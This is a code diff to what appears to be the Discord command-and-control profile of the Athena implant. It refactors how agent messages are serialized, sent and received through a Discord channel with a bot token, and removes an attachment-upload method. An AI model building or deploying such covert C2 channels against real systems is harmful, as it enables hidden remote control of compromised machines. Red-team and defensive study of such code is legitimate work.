@@ -6,13 +6,12 @@ using System.Threading.Tasks;
 using System.Collections.Generic;
 using System.Collections.Specialized;
 using System.Linq;
-
-
 using System.Net.Http;
 using System.Text;
 using System.Net.Http.Headers;
 using System.IO;
 using Athena.Models.Config;
+using System.Text.Json;
 
 namespace Profiles
 {
@@ -45,7 +44,6 @@ namespace Profiles
         private HttpClient discordClient { get; set; }
         private string BotToken { get; set; }
         private string ChannelID { get; set; }
-        //  private string current_message { get; set; }
         private int timeBetweenChecks { get; set; } //How long (in seconds) to wait in between checks
         private string userAgent { get; set; }
         public string proxyHost { get; set; }
@@ -102,14 +100,13 @@ namespace Profiles
             }
         }
         //Dockerfile, config.json, c2_server.sh, C2_RPC_functions, dicsord.py
-        public async Task<string> Send(object obj)
+        public async Task<string> Send(string json)
         {
             try
             {
                 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                 //This will check to see if it needs to be encrypted first and convert the string properly. You can likely keep this here.
                 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-                string json = JsonSerializer.Serialize(obj);
                 if (this.encrypted)
                 {
                     json = this.crypt.Encrypt(json);
@@ -186,7 +183,8 @@ namespace Profiles
                 } while (agentMessages.Count() < 1);
 
                 //No concept of chunking yet, so just grab one
-                json = agentMessages.FirstOrDefault().message;
+                string strRes = agentMessages.FirstOrDefault().message;
+
                 DeleteMessages(msgToRemove);
 
                 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -194,17 +192,17 @@ namespace Profiles
                 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                 if (this.encrypted)
                 {
-                    return this.crypt.Decrypt(json);
+                    return this.crypt.Decrypt(strRes);
                 }
                 else
                 {
-                    if (String.IsNullOrEmpty(json))
+                    if (String.IsNullOrEmpty(strRes))
                     {
                         return json;
                     }
                     else
                     {
-                        return (await Misc.Base64Decode(json)).Substring(36);
+                        return (await Misc.Base64Decode(strRes)).Substring(36);
                     }
                 }
             }
@@ -234,40 +232,6 @@ namespace Profiles
             var res = await discordClient.GetAsync(url);
             string ResponseMessages = await res.Content.ReadAsStringAsync();
             return JsonSerializer.Deserialize<List<ServerDetails>>(ResponseMessages) ?? new List<ServerDetails>(); // eithe return the responses Or if it fails get a derisalised response AKA with d ata or no data
-        }
-
-        public async Task<bool> SendAttachment2(string msg) //8mb by default, A file upload size limit applies to all files in a request 
-        {
-            try
-            {
-                byte[] msgBytes = System.Text.Encoding.UTF8.GetBytes(JsonSerializer.Serialize(msg));
-                string url = "https://discord.com/api/channels/" + ChannelID + "/messages";
-                MultipartFormDataContent content = new MultipartFormDataContent();
-                ByteArrayContent fileContent = new ByteArrayContent(msgBytes);
-                fileContent.Headers.ContentType = new MediaTypeHeaderValue("multipart/form-data");
-                fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("filename")
-                {
-                    FileName = agent_guid + ".txt",
-                };
-
-                content.Add(fileContent);
-
-                using (MemoryStream stream = new MemoryStream(msgBytes))
-                {
-                    var res = await discordClient.PostAsync(url, fileContent);
-                    string responseMessage = await res.Content.ReadAsStringAsync();
-                    if (res.IsSuccessStatusCode)
-                    {
-                        return true;
-                    }
-                }
-                return false;
-            }
-            catch
-            {
-                return false;
-            }
-
         }
 
         public async Task<bool> SendAttachment(string msg) //8mb by default, A file upload size limit applies to all files in a request 
